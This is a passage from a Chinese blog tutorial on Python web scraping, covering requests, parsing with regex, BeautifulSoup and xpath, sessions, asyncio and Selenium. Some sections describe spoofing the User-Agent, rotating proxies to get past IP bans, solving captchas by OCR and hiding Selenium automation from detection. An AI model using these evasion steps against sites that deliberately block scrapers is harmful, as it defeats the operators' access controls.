浏览器搜索的关键字</span></span><br><span class="line">query=value</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理请求</span></span><br><span class="line">data_text = response.text</span><br></pre></td></tr></table></figure><h3 id="4-UA伪装"><a href="#4-UA伪装" class="headerlink" title="4 UA伪装"></a>4 UA伪装</h3><blockquote><p>UA：User-Agent，代理。</p><p>门户网站会检测请求载体的身份，若不是基于某一浏览器的，则表示该请求不正常，服务器很可能会拒绝该次请求。</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 字典封装</span></span><br><span class="line">header = &#123;<span class="string">&quot;User-Agent &quot;</span>:value&#125;</span><br><span class="line"><span class="comment"># 自动处理参数：报头</span></span><br><span class="line">response = requests.get(headers = header)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 代理服务器</span></span><br><span class="line">User-Agent=value</span><br><span class="line"><span class="comment"># 链接来源网址</span></span><br><span class="line">referer</span><br></pre></td></tr></table></figure><h3 id="5-ajax请求"><a href="#5-ajax请求" class="headerlink" title="5 ajax请求"></a>5 ajax请求</h3><blockquote><p><a href="https://www.cnblogs.com/wind-zhou/p/12973197.html">post方法</a></p><p><a href="https://blog.csdn.net/m_S_L/article/details/89460964">XHR</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 例子：破解百度翻译</span></span><br><span class="line"><span class="comment"># 网址是：https://fanyi.baidu.com/sug（是ajax请求新更新的网址）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 字典封装</span></span><br><span class="line">data = &#123;<span class="string">&quot;kw&quot;</span>:value&#125;</span><br><span class="line">header = &#123;<span class="string">&quot;User-Agent&quot;</span>:value&#125;</span><br><span class="line">response = requests.post(url=url,timeout=<span class="number">15</span>,data=data,headers=header)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理请求：response.json() 返回一个对象（确认数据返回类型是json（报头中的content-type）才可以使用该方法</span></span><br><span class="line">dic_json = requests.json()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 持久化存储（获取的数据中有中文，设置ascii存储关闭）</span></span><br><span class="line">json.dump(data,fp,ensure_ascii=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="6-json库"><a href="#6-json库" class="headerlink" title="6 json库"></a>6 json库</h3><blockquote><p><a href="https://www.cnblogs.com/qlqwjy/p/11576746.html">json库</a>    </p><p><a href="https://zhuanlan.zhihu.com/p/440587133?utm_id=0">loads链接</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 存入文件（获取的数据中有中文，设置ascii存储关闭）</span></span><br><span class="line">json.dump(data,fp,ensure_ascii=<span class="literal">False</span>)</span><br><span class="line"><span class="comment"># 字符串变json</span></span><br><span class="line">res = json.loads(<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure><h3 id="7-response数据解析"><a href="#7-response数据解析" class="headerlink" title="7 response数据解析"></a>7 response数据解析</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 文本</span></span><br><span class="line">response.text / text()</span><br><span class="line"><span class="comment"># 二进制</span></span><br><span class="line">response.content / read()</span><br><span class="line"><span class="comment"># 对象</span></span><br><span class="line">response.json / json()</span><br></pre></td></tr></table></figure><h3 id="8-技巧"><a href="#8-技巧" class="headerlink" title="8 技巧"></a>8 技巧</h3><blockquote><p>有的页面数据并不是直接存在html中的，而是通过ajax请求获得了一次。<br>新生成的页面可能域名是一致的，但是参数不一致。</p><p>F12——Ctrl + F：搜索</p></blockquote><h3 id="9-get-与-post-的使用"><a href="#9-get-与-post-的使用" class="headerlink" title="9 get 与 post 的使用"></a>9 get 与 post 的使用</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># get</span></span><br><span class="line"><span class="comment"># 字典封装</span></span><br><span class="line">param = &#123;<span class="string">&quot;query&quot;</span>:value&#125;</span><br><span class="line">response = requests.get( params = param )（自动处理参数：请求参数）</span><br><span class="line">query=value：浏览器搜索的关键字（参数）</span><br><span class="line"></span><br><span class="line"><span class="comment"># post</span></span><br><span class="line">response = requests.post(url=url,timeout=<span class="number">15</span>,data=data ,headers=header,files=file)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 表单字典。</span></span><br><span class="line">data=&#123;&#125;</span><br><span class="line"><span class="comment"># files：文件上传字典，</span></span><br><span class="line">file=&#123;<span class="string">&quot;name&quot;</span>:(path,param),...&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="三、数据解析"><a href="#三、数据解析" class="headerlink" title="三、数据解析"></a>三、数据解析</h2><h3 id="1-原理"><a href="#1-原理" class="headerlink" title="1 原理"></a>1 原理</h3><ol><li>标签定位。</li><li>提取标签、标签属性中存储的数据值。</li></ol><h3 id="2-re库"><a href="#2-re库" class="headerlink" title="2 re库"></a>2 re库</h3><ul><li><p>正则表达式    </p><blockquote><p><a href="https://github.com/ziishaned/learn-regex/blob/master/translations/README-cn.md#learn-regex">正则表达式教程</a>    </p><p><a href="https://regex101.com/">测试网站</a></p><p><a href="https://www.cnblogs.com/fozero/p/7868687.html">常用正则表达式大全</a></p></blockquote><ul><li>普通使用<ul><li>e?：e 出现 0-1 次。</li><li>b*：b 出现 0-n 次。</li><li>h+：h 出现 1-n 次。</li><li>b{}：出现次数限定，b{6}（6次），b{2,6}（2-6次），b{2,}（2次以上）</li><li>[]：指定字符范围。<code>[a-z]</code>，<code>[a-zA-Z]</code>，<code>[a-zA-Z0-9]</code>，<code>[^0-9]</code>（除0-9外所有字符（包元字符））</li><li>(ab)+：ab 出现 1-n 次。</li><li>(cat|dog)：cat 或 dog。</li></ul></li><li>特殊字符<ul><li>\d：数字字符；\D：非数字字符。</li><li>\w：英文、数字及下划线；\W：非单词字符。</li><li>\s：空白符（tab和换行）；\S：非空白字符。</li><li>\b：单词开头或结尾，单词的分界处。</li><li>.：任意字符。（不包换行符 ）</li><li>^a：只匹配行首a，头要是a。</li><li>a$：只匹配行尾a，尾要是a。</li></ul></li><li>使用技巧<ul><li>标签匹配：&lt;.+?&gt;。不加 ? 会全匹配，加了会从贪婪匹配变成懒惰匹配。</li><li>RGB十六进制匹配：#[a-fA-F0-9]{6}\b</li><li>IPv4匹配：\b((25[0-5]|2[0-4]\d|[01]?\d\d?).){3}(25[0-5]|2[0-4]\d|[01]?\d\d?)\b（会匹配：00.00.00.00）</li></ul></li></ul></li><li><p>re</p><blockquote><p><a href="https://www.runoob.com/python/python-reg-expressions.html">python的re</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 编译正则表达式</span></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(pattern,flags)。</span><br><span class="line"><span class="comment"># 找到第一个，输出是 lst.group()</span></span><br><span class="line">lst = pattern.search(<span class="built_in">str</span>)</span><br><span class="line"><span class="comment"># 找到所有。（数据解析：re.S）</span></span><br><span class="line">lst = pattern.findall(<span class="built_in">str</span>,flags)</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-BeautifulSoup库"><a href="#3-BeautifulSoup库" class="headerlink" title="3 BeautifulSoup库"></a>3 BeautifulSoup库</h3><ul><li><p>导入</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install beautifulsoup4</span><br><span class="line">pip install lxml</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> bs4 <span class="keyword">from</span> BeautifulSoup</span><br></pre></td></tr></table></figure></li><li><p>原理</p><ol><li>实例化一个BeautifulSoup对象，并且将页面源码数据加载到该对象中。</li><li>通过调用BeautifulSoup对象中相关的属性或者方法进行标签定位和数据提取。</li></ol></li><li><p>实例化BeautifulSoup对象</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 本地加载</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;0.txt&quot;</span>,<span class="string">&quot;r&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    soup = BeautifulSoup(f,<span class="string">&quot;lxml&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 网络加载</span></span><br><span class="line">page_text = response.text</span><br><span class="line">soup = BeautifulSoup(page_text,<span class="string">&quot;lxml&quot;</span>)</span><br></pre></td></tr></table></figure></li><li><p>属性和方法</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 取得标签</span></span><br><span class="line"><span class="comment"># 返回html第一次出现的标签（tagName：填tag名称）</span></span><br><span class="line">soup.tagName</span><br><span class="line"><span class="comment"># 同理于soup.tagName（attr填标签属性，以此找到第一个满足条件的标签，例：type=&quot;text/javascript&quot;（class要加下划线变成class_</span></span><br><span class="line"><span class="comment"># 发现一个</span></span><br><span class="line">soup.find(<span class="string">&quot;tag&quot;</span>[,attr])</span><br><span class="line">soup.find(class_ = <span class="string">&#x27;item-1&#x27;</span>)</span><br><span class="line"><span class="comment"># 满足要求的所有标签</span></span><br><span class="line">soup.find_all(<span class="string">&quot;tag&quot;</span> [,attr])</span><br><span class="line">soup.find_all(attrs=&#123;<span class="string">&#x27;class&#x27;</span>:<span class="string">&#x27;item-1&#x27;</span>&#125;)</span><br><span class="line"><span class="comment"># 返回一个满足要求的标签的列表</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">selector：id(#)，class(.)，标签选择器，例：</span></span><br><span class="line"><span class="string">soup.select(&quot;.tang &gt; ul &gt; li &gt; a&quot;)（ &gt; ：一个层级，space：多个层级）</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">soup.select(<span class="string">&quot;selector&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得文本</span></span><br><span class="line">soup.tagName.text/string/get_text()</span><br><span class="line"><span class="comment"># 获得某一个标签中的所有内容</span></span><br><span class="line">text/get_text()</span><br><span class="line"><span class="comment"># 只获得该标签的直系内容（标签中标签的内容无法获得）</span></span><br><span class="line">string</span><br><span class="line"></span><br><span class="line"><span class="comment"># 整理文本</span></span><br><span class="line"><span class="comment"># 按照标准缩进格式输出</span></span><br><span class="line">soup.prettify()</span><br></pre></td></tr></table></figure></li><li><p>简单使用</p><blockquote><p><a href="https://www.jb51.net/article/202379.htm">bs4简单使用</a></p></blockquote></li></ul><h3 id="4-xpath库"><a href="#4-xpath库" class="headerlink" title="4 xpath库"></a>4 xpath库</h3><ul><li><p>优势</p><blockquote><p>最常用且最便捷高效的一种解析方式，通用性强，可以用于别的语言。</p></blockquote></li><li><p>原理</p><ol><li>实例化一个etree对象，并且将页面源码数据加载到该对象中。</li><li>通过调用etree对象中xpath方法结合着xpath表达式实现标签的定位和内容的捕获。</li></ol></li><li><p>导入</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install lxml</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br></pre></td></tr></table></figure></li><li><p>实例化etree对象</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 本地加载</span></span><br><span class="line">parser = etree.HTMLParser(encoding=<span class="string">&quot;UTF-8&quot;</span>)</span><br><span class="line">et = etree.parse( filePath,parser=parser)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 网络加载</span></span><br><span class="line">et = etree.HTML( page_text)</span><br></pre></td></tr></table></figure></li><li><p>数据解析</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 返回：一个列表，包含所有满足条件的&lt;Element LabelName&gt;</span></span><br><span class="line">res = et.xpath( <span class="string">&quot;xpath表达式&quot;</span> )</span><br><span class="line"></span><br><span class="line"><span class="comment"># ./：从当前标签开始（li开始，先取到li）</span></span><br><span class="line">res = li.xpath(<span class="string">&quot;./div&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># / ：表示从根节点开始定位</span></span><br><span class="line">res = et.xpath(<span class="string">&quot;/html/head/script&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># // ：表示多个层级，或表示从任意位置开始定位</span></span><br><span class="line">res = et.xpath(<span class="string">&quot;/html//script&quot;</span>)</span><br><span class="line">res = et.xpath(<span class="string">&quot;//script&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [@label= &quot;value&quot;]：表示属性定位</span></span><br><span class="line">res = et.xpath(<span class="string">&#x27;//script[@type=&quot;text/javascript&quot;]&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [num]：表示第几个标签（索引从1开始）</span></span><br><span class="line">res = et.xpath(<span class="string">&#x27;//script[@type=&quot;text/javascript&quot;][1]&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># /text()：获取标签中直系的文本内容</span></span><br><span class="line">res = et.xpath(<span class="string">&#x27;//script[@type=&quot;text/javascript&quot;][1]/text()&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># //text()：获取标签中非直系的文本内容</span></span><br><span class="line">res = et.xpath(<span class="string">&#x27;//script[@type=&quot;text/javascript&quot;][1]//text()&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># /@attrName：获取标签中的属性值</span></span><br><span class="line">res = et.xpath(<span class="string">&#x27;//script[2]/@type&#x27;</span>)</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="四、身份认证"><a href="#四、身份认证" class="headerlink" title="四、身份认证"></a>四、身份认证</h2><h3 id="1-验证码"><a href="#1-验证码" class="headerlink" title="1 验证码"></a>1 验证码</h3><ul><li><p>简单验证</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install ddddocr</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ddddocr</span><br><span class="line">ocr = ddddocr.DdddOcr()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span> ( <span class="string">&#x27;jpg&#x27;</span> , <span class="string">&#x27;rb&#x27;</span> ) <span class="keyword">as</span> f:</span><br><span class="line">    img_bytes = f.read()</span><br><span class="line">res = ocr.classification( img_bytes )</span><br><span class="line"><span class="built_in">print</span>( res )</span><br></pre></td></tr></table></figure></li><li><p>步骤</p><ol><li>下载验证码图片到本地。</li><li>识别验证码。</li><li>上传结果登入成功。（登入成功的post请求中带有验证码参数，进行修改）</li></ol></li><li><p>响应状态码</p><p><code>res = response.status_code</code>（200为成功）</p></li><li><p>高级验证</p><blockquote><p>使用超级鹰。</p></blockquote></li></ul><h3 id="2-Cookie"><a href="#2-Cookie" class="headerlink" title="2 Cookie"></a>2 Cookie</h3><blockquote><p>Request Headers——Cookie       </p></blockquote><ul><li>手动Cookie：headers = { “cookie”:”value” }</li><li>自动Cookie：模拟登入post请求后，由服务器创建。</li><li>session会话对象：<ol><li>可以进行请求的发送。</li><li>如果请求过程中产生了cookie，则该 cookie 会被自动存储 / 携带在该 session 对象中。</li></ol></li><li>session使用：<ol><li>创建session对象：session = requests.Session()</li><li>使用session对象进行模拟登入（找到是哪个 url 设置了 cookie 值（set-cookie））：session.post()（参数同requests）</li><li>session对象对目标进行get请求（携带了cookie）：session.get()（参数同requests）</li></ol></li></ul><h3 id="3-代理"><a href="#3-代理" class="headerlink" title="3 代理"></a>3 代理</h3><ul><li>目的：破解封IP反爬机制。</li><li>作用：突破IP访问限制，伪装IP。</li><li><p>使用：<code>requests.get/post(proxies = &#123;&quot;type&quot;:&quot;IP:Port&quot;&#125;)</code>（type：类型）</p></li><li><p>代理 IP 透明度：</p><ul><li>透明：服务器知道该次请求使用了代理，也知道请求对应的真真实IP。</li><li>匿名：服务器知道使用了代理，不知道真实IP。</li><li>高匿：服务器不知道使用了代理和IP地址。</li></ul></li></ul><hr><h2 id="五、高性能异步爬虫"><a href="#五、高性能异步爬虫" class="headerlink" title="五、高性能异步爬虫"></a>五、高性能异步爬虫</h2><h3 id="1-多线程、多进程（不建议）"><a href="#1-多线程、多进程（不建议）" class="headerlink" title="1 多线程、多进程（不建议）"></a>1 多线程、多进程（不建议）</h3><ul><li>特点<ul><li>优势：可以为相关阻塞的操作单独开启线程或者进程，阻塞操作救可以异步执行。</li><li>劣势：无法无限制的开启多线程或者多进程，比较耗费资源，会乱序。</li></ul></li></ul><h3 id="2-线程池、进程池（适当使用）"><a href="#2-线程池、进程池（适当使用）" class="headerlink" title="2 线程池、进程池（适当使用）"></a>2 线程池、进程池（适当使用）</h3><ul><li><p>特点</p><ul><li>优势：可以降低系统对进程或者线程创建和销毁的一个频率，从而很好地降低系统的开销。</li><li>劣势：池中线程或进程的数量有上限，会乱序。</li><li>使用：线程池应应用于阻塞且耗时的操作。</li></ul></li><li><p>使用</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一个线程池中创建几个线程对象</span></span><br><span class="line">pool = Pool(num)</span><br><span class="line"><span class="comment"># 为函数异步执行可迭代对象，返回值是函数的返回值（一个列表）</span></span><br><span class="line">pool.<span class="built_in">map</span>(func,iterable)</span><br><span class="line"><span class="comment"># 关闭线程池</span></span><br><span class="line">pool.close()</span><br><span class="line"><span class="comment"># 主线程结束后子线程结束</span></span><br><span class="line">pool.join()</span><br></pre></td></tr></table></figure></li><li><p>==案例==</p><blockquote><p>B站UP住岚山蓝啊的专栏</p></blockquote></li></ul><h3 id="3-单线程-异步协程（推荐）"><a href="#3-单线程-异步协程（推荐）" class="headerlink" title="3 单线程 + 异步协程（推荐）"></a>3 单线程 + 异步协程（推荐）</h3><ul><li><p>基础</p><ul><li><p>event_loop</p><blockquote><p>事件循环，相当于一个无限循环，我们可以把一些函数注册到这个事件循环上，当满足某些条件的时候，函数就会被循环执行。</p></blockquote></li><li><p>coroutine</p><blockquote><p>协程对象，我们可以将协程对象注册到事件循环中，它会被事件循环调用。我们可以使用。</p></blockquote></li><li><p>async</p><blockquote><p>定义一个方法，这个方法在调用时不会立即被执行，而是返回一个协程对象。</p></blockquote></li><li><p>task</p><blockquote><p>任务，它是对协程对象的进一步封装，包含了任务的各个状态。</p></blockquote></li><li><p>future</p><blockquote><p>代表将来执行或还没有执行的任务，实际上和 task没有本质区别。</p></blockquote></li><li><p>async</p><blockquote><p>定义一个协程。</p></blockquote></li><li><p>await</p><blockquote><p>用来挂起阻塞方法的执行。 </p></blockquote></li></ul></li><li><p>单任务使用</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义协程</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">re</span>(<span class="params">url:<span class="built_in">str</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Doing url&quot;</span>,url)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;end&quot;</span>)</span><br><span class="line"></span><br><span class="line">c = re(<span class="string">&quot;[www.baidu.com](http://www.baidu.com/)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个事件循环对象并执行</span></span><br><span class="line">loop = asyncio.new_event_loop()</span><br><span class="line">asyncio.set_event_loop(loop)</span><br><span class="line">loop.run_until_complete(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接启动协程</span></span><br><span class="line">asyncio.run(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 封装到 task 中</span></span><br><span class="line">loop = asyncio.new_event_loop()</span><br><span class="line">asyncio.set_event_loop(loop)</span><br><span class="line">task = loop.create_task(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 封装到 future 中</span></span><br><span class="line">loop = asyncio.new_event_loop()</span><br><span class="line">asyncio.set_event_loop(loop)</span><br><span class="line">task = asyncio.ensure_future(c,loop=loop)</span><br><span class="line">loop.run_until_complete(task)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绑定回调（task执行成功后会自动执行回调函数，参数为 task ）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">callback_func</span>(<span class="params">task</span>):</span><br><span class="line">    <span class="built_in">print</span>(task.result())  <span class="comment">#  task 绑定的函数的返回值</span></span><br><span class="line">loop = asyncio.new_event_loop()</span><br><span class="line">asyncio.set_event_loop(loop)</span><br><span class="line">task = asyncio.ensure_future(c,loop=loop)</span><br><span class="line">task.add_done_callback(callback_func)</span><br><span class="line">loop.run_until_complete(task)</span><br></pre></td></tr></table></figure></li><li><p>多任务使用</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">request</span>(<span class="params">url:<span class="built_in">str</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Downloading&quot;</span>,url,<span class="string">&quot;...&quot;</span>)</span><br><span class="line">    <span class="comment"># 异步协程不能有同步模块代码，所以不能用 time.sleep(2)，否则不会异步</span></span><br><span class="line">    <span class="comment"># 在 asyncio 遇到的阻塞操作必须手动挂起，不然会报错</span></span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;OK for&quot;</span>,url)</span><br><span class="line"></span><br><span class="line">start = time.time()</span><br><span class="line">urls = [<span class="string">&quot;www.baidu.com&quot;</span>,<span class="string">&quot;www.sogou.com&quot;</span>,<span class="string">&quot;www.google.com&quot;</span>]</span><br><span class="line">loop = asyncio.new_event_loop()</span><br><span class="line">asyncio.set_event_loop(loop)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 存放多个任务对象</span></span><br><span class="line">stasks = []</span><br><span class="line"><span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">    c = request(url)</span><br><span class="line">    task = asyncio.ensure_future(c,loop=loop)</span><br><span class="line">    stasks.append(task)</span><br><span class="line"><span class="comment"># 多任务对象列表需要封装到 wait 中</span></span><br><span class="line">loop.run_until_complete(asyncio.wait(stasks))</span><br><span class="line"><span class="built_in">print</span>(time.time()-start)</span><br></pre></td></tr></table></figure></li><li><p>flask框架搭建网页</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index_main</span>():</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure></li><li><p>aiohttp模块</p><blockquote><p>因为 resquests.get() 是基于同步，所以基于异步需要 aiohttp 模块</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">request</span>(<span class="params">url:<span class="built_in">str</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Downloading... &quot;</span>)</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> aiohttp.ClientSession() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="comment"># 参数同requests.get()，post()同理</span></span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">with</span> session.get(url) <span class="keyword">as</span> response:</span><br><span class="line">            <span class="comment"># 不挂起会异常，或者不用函数，直接text</span></span><br><span class="line">            page_text = <span class="keyword">await</span> response.text()</span><br><span class="line">            <span class="built_in">print</span>(page_text)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Finished&quot;</span>)</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="六、自动化"><a href="#六、自动化" class="headerlink" title="六、自动化"></a>六、自动化</h2><h3 id="1-selenium模块"><a href="#1-selenium模块" class="headerlink" title="1 selenium模块"></a>1 selenium模块</h3><blockquote><p><a href="https://www.cnblogs.com/guanyuan12/p/16853991.html">键鼠操作</a></p></blockquote><ul><li><p>驱动下载</p><blockquote><p><a href="https://chromedriver.storage.googleapis.com/index.html">google下载</a></p><p><a href="https://blog.csdn.net/weixin_45532870/article/details/108686827">驱动与版本映射关系（网盘有）</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.service <span class="keyword">import</span> Service</span><br><span class="line">ser = Service( <span class="string">r&quot;./chromedriver.exe&quot;</span> )</span><br><span class="line">bro = webdriver.Chrome( service = ser )</span><br></pre></td></tr></table></figure></li><li><p>简单使用    </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="comment"># 打开浏览器</span></span><br><span class="line">driver = webdriver.Chrome()</span><br><span class="line"><span class="comment"># 打开的网址</span></span><br><span class="line">driver.get(<span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="comment"># 获得源码</span></span><br><span class="line">text = driver.page_source</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="comment"># 通过元素找标签，元素选择在 By 类中</span></span><br><span class="line">input_tag = driver.find_element(by,value)</span><br><span class="line"><span class="comment"># 设置标签值</span></span><br><span class="line">input_tag.send_keys()</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys <span class="comment"># 键盘操作</span></span><br><span class="line"><span class="comment"># 键盘操作</span></span><br><span class="line">send_keys( Keys.ENTER )</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.action_chains <span class="keyword">import</span> ActionChains <span class="comment"># 鼠标操作</span></span><br><span class="line"><span class="comment"># 鼠标操作</span></span><br><span class="line">ActionChains(driver).click(input_tag).perform()</span><br><span class="line"><span class="comment"># 左键单击</span></span><br><span class="line">input_tag.click()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 回退</span></span><br><span class="line">driver.back() </span><br><span class="line"><span class="comment"># 前进</span></span><br><span class="line">driver.forward() </span><br><span class="line"><span class="comment">#退出</span></span><br><span class="line">driver.quit() </span><br></pre></td></tr></table></figure></li><li><p>定位</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 切换定位到指定 id 的 iframe 中</span></span><br><span class="line">iframe：driver.switch_to.frame(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line"><span class="comment"># 浏览器中元素中的某一点定位</span></span><br><span class="line">ActionChains(bro).move_to_element_with_offset(tag,x,y).click().perform()</span><br></pre></td></tr></table></figure></li><li><p>等待</p><blockquote><p><a href="https://www.cnblogs.com/chushujin/p/12307746.html">隐式等待</a></p><p><code>driver.implicitly_wait(time_to_wait=10)</code>（界面全部加载完成后才会向下执行代码，超出时间则抛出异常）</p></blockquote></li><li><p>无头浏览器（无界面显示）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"></span><br><span class="line">op = Options()</span><br><span class="line">op.add_argument(<span class="string">&#x27;--headless&#x27;</span>)</span><br><span class="line">op.add_argument(<span class="string">&#x27;--disable-gpu&#x27;</span>)</span><br><span class="line">driver = webdriver.Chrome(options=op)</span><br></pre></td></tr></table></figure></li><li><p>防检测（不一定有效）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">op = Options()</span><br><span class="line">op.add_experimental_option(<span class="string">&#x27;excludeSwitches&#x27;</span>,[<span class="string">&#x27;enable-automation&#x27;</span>])</span><br><span class="line">driver = webdriver.Chrome(options=op)</span><br></pre></td></tr></table></figure></li><li><p>鼠标高级操作</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 拖动</span></span><br><span class="line">action = ActionChains( driver )</span><br><span class="line">action.click_and_hold( tag )    <span class="comment"># 按住</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>( num ) :</span><br><span class="line">    action.move_by_offset( x , y ).perform()  <span class="comment"># 位移</span></span><br><span class="line">action.release() <span class="comment"># 释放动作链</span></span><br></pre></td></tr></table></figure></li><li><p>其他操作</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 浏览器</span></span><br><span class="line"><span class="comment"># 整张截图存入 png 中</span></span><br><span class="line">driver.save_screenshot( <span class="string">&quot;.png&quot;</span> )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 组件</span></span><br><span class="line"><span class="comment"># 左上角的坐标（字典key为 x , y）</span></span><br><span class="line">tag.location</span><br><span class="line"><span class="comment"># 大小（字典key为 x , y）</span></span><br><span class="line">tag.size：</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-图片处理"><a href="#2-图片处理" class="headerlink" title="2 图片处理"></a>2 图片处理</h3><ul><li><p>Image</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取path中图片</span></span><br><span class="line">im = Image.<span class="built_in">open</span>( path )</span><br><span class="line"><span class="comment"># 指定范围裁剪（tuple：( 左上x，左上y，右下x，右下y)）</span></span><br><span class="line">res = im.crop( <span class="built_in">tuple</span> )</span><br><span class="line"><span class="comment"># 存入到path中</span></span><br><span class="line">res.save( path 